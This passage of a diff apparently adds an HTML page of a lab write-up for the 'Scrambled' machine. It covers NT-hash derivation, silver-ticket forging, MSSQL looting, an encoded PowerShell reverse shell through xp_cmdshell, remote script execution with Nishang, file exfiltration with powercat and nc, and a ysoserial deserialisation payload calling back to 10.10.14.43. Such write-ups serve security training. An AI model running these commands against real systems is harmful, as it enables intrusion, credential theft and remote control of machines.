+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;Pegasus60&quot;</span><span class="p">|</span>xxd
+<span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;Pegasus60&quot;</span><span class="p">|</span>iconv<span class="w"> </span>-f<span class="w"> </span>ASCII<span class="w"> </span>-t<span class="w"> </span>UTF-16LE<span class="p">|</span>xxd
+<span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;Pegasus60&quot;</span><span class="p">|</span>iconv<span class="w"> </span>-f<span class="w"> </span>ASCII<span class="w"> </span>-t<span class="w"> </span>UTF-16LE<span class="p">|</span>openssl<span class="w"> </span>dgst<span class="w"> </span>-md4
+<span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;Pegasus60&quot;</span><span class="p">|</span>iconv<span class="w"> </span>-f<span class="w"> </span>ASCII<span class="w"> </span>-t<span class="w"> </span>UTF-16LE<span class="p">|</span>openssl<span class="w"> </span>dgst<span class="w"> </span>-md4<span class="p">|</span>awk<span class="w"> </span><span class="s1">&#39;{print $NF}&#39;</span>
+b999a16500b87d17ec7f2e2a68778f05
+</pre></div>
+</div>
+<p>Generating a “Silver ticket” to access the MsSQL instance</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ticketer.py<span class="w"> </span><span class="se">\</span>
+-nthash<span class="w"> </span>b999a16500b87d17ec7f2e2a68778f05<span class="w"> </span><span class="se">\</span>
+-domain-sid<span class="w"> </span>S-1-5-21-2743207045-1827831105-2542523200<span class="w"> </span><span class="se">\</span>
+-domain<span class="w"> </span>scrm.local<span class="w"> </span><span class="se">\</span>
+-spn<span class="w"> </span>MSSQLSvc/dc1.scrm.local<span class="w"> </span><span class="se">\</span>
+-user-id<span class="w"> </span><span class="m">500</span><span class="w"> </span><span class="se">\</span>
+Administrator
+</pre></div>
+</div>
+</section>
+<section id="mssql-foothold">
+<h2>MsSQL Foothold<a class="headerlink" href="#mssql-foothold" title="Permalink to this heading">#</a></h2>
+<p>Use the “Silver Ticket” TGS to connect to MsSQL with impacket</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+mssqlclient.py<span class="w"> </span>-k<span class="w"> </span>dc1.scrm.local
+</pre></div>
+</div>
+<p>Loot the Database</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">databases</span>
+<span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="n">tabe_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span>
+<span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">ScrambleHR</span>
+<span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">UserImport</span>
+<span class="n">MiscSvc</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">ScrambledEggs9900</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">scrm</span><span class="p">.</span><span class="k">local</span>
+</pre></div>
+</div>
+<p>Use <code class="docutils literal notranslate"><span class="pre">enable_xp_cmdshell</span></code> to run a shell through MsSQL
+<a class="reference external" href="https://www.revshells.com/">https://www.revshells.com/</a></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SQL</span><span class="o">&gt;</span> <span class="n">enable_xp_cmdshell</span>
+<span class="n">SQL</span><span class="o">&gt;</span> <span class="n">xp_cmdshell</span> <span class="n">powershell</span> <span class="o">-</span><span class="n">e</span> <span class="n">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAAzACIALAA0ADIANAAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA</span><span class="o">==</span>
+</pre></div>
+</div>
+</section>
+<section id="lateral-privesc">
+<h2>Lateral privesc<a class="headerlink" href="#lateral-privesc" title="Permalink to this heading">#</a></h2>
+<p>Run Nishang’s Invoke-PowerShellTcp.ps1 as scrm\miscsvc</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;ScrambledEggs9900&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+<span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s2">&quot;scrm\miscsvc&quot;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+
+<span class="nb">Invoke-Command</span> <span class="n">-Computer</span> <span class="n">dc1</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">downloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.43:8000/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">43</span> <span class="n">-Port</span> <span class="n">4545</span> <span class="p">}</span> <span class="n">-Credential</span> <span class="nv">$creds</span>
+</pre></div>
+</div>
+</section>
+<section id="binary-reversing-and-exploitation">
+<h2>Binary reversing and exploitation<a class="headerlink" href="#binary-reversing-and-exploitation" title="Permalink to this heading">#</a></h2>
+<p>Exfitrate ScrambleClient.exe with powercat</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Webclient</span><span class="p">).</span><span class="n">downloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.43:8000/powercat.ps1&#39;</span><span class="p">)</span>
+<span class="n">powercat</span> <span class="n">-c</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">43</span> <span class="n">-p</span> <span class="n">4646</span> <span class="n">-i</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">miscsvc</span><span class="p">\</span><span class="n">Downloads</span><span class="p">\</span><span class="n">ScrambleLib</span><span class="p">.</span><span class="n">dll</span>
+<span class="n">nc</span> <span class="n">-lp</span> <span class="n">4646</span> <span class="n">-q</span> <span class="n">1</span>  <span class="p">&gt;</span> <span class="n">ScrambleLib</span><span class="p">.</span><span class="n">dll</span> <span class="p">&lt;</span> <span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">null</span>
+<span class="n">powercat</span> <span class="n">-c</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">43</span> <span class="n">-p</span> <span class="n">4646</span> <span class="n">-i</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">miscsvc</span><span class="p">\</span><span class="n">Downloads</span><span class="p">\</span><span class="n">ScrambleClient</span><span class="p">.</span><span class="n">exe</span>
+<span class="n">nc</span> <span class="n">-lp</span> <span class="n">4646</span> <span class="n">-q</span> <span class="n">1</span>  <span class="p">&gt;</span> <span class="n">ScrambleClient</span><span class="p">.</span><span class="n">exe</span> <span class="p">&lt;</span> <span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">null</span>
+</pre></div>
+</div>
+<p>We then need to reverse the binary and dll with dnSpy to figure out that it uses BinaryFormatter.<br />
+Which does some insecure deserialisation and will let us execute one more reverse shell</p>
+<p>Use the .NET adaptation of ysoserial to craft payload</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">./</span><span class="n">ysoserial</span><span class="p">.</span><span class="n">exe</span> <span class="o">-f</span> <span class="n">BinaryFormatter</span> <span class="n">-g</span> <span class="n">WindowsIdentity</span> <span class="n">-o</span> <span class="n">base64</span> <span class="n">-c</span> <span class="s2">&quot;powershell IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://10.10.14.43:8000/Invoke-TcpReverseShell.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.43 -Port 4747&quot;</span>
+</pre></div>
+</div>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../shared/shared.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Shared</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../sandworm/sandworm.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Sandworm</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Scrambled</a><ul>
+<li><a class="reference internal" href="#enum">Enum</a></li>
+<li><a class="reference internal" href="#kerberos-bruteforcing">Kerberos bruteforcing</a></li>
+<li><a class="reference internal" href="#obtaining-a-tgt">Obtaining a TGT</a></li>
+<li><a class="reference internal" href="#kerberoasting">Kerberoasting</a></li>
+<li><a class="reference internal" href="#silver-ticket-attack">Silver Ticket Attack</a></li>
+<li><a class="reference internal" href="#mssql-foothold">MsSQL Foothold</a></li>
+<li><a class="reference internal" href="#lateral-privesc">Lateral privesc</a></li>
+<li><a class="reference internal" href="#binary-reversing-and-exploitation">Binary reversing and exploitation</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
